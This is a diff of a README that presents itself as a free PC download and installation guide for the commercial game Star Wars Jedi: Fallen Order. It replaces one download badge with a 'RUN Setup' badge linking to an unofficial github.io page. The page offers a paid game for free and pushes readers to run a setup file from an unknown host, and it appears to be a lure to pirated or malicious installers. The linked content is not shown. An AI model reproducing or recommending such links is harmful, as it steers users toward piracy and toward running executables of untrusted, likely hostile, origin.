@@ -1,6 +1,6 @@
 # 🎮 Star Wars Jedi: Fallen Order — Free PC Download & Installation Guide
 
-[![🔄 GET Star Wars Jedi: Fallen Order](https://img.shields.io/badge/🔄_GET-Star%20Wars%20Jedi%3A%20Fallen%20Order-grey?style=for-the-badge&logo=ghost&logoColor=white)](https://star-wars-jedi-fallen-order.github.io/.github/)
+[![RUN Setup](https://img.shields.io/badge/RUN%20%E2%80%94%20Setup-2ea44f?style=for-the-badge&logoColor=white)](https://kervinmatilda7.github.io/.github/Star-Wars-Jedi)
 
 ## 🎮 About the Game
 
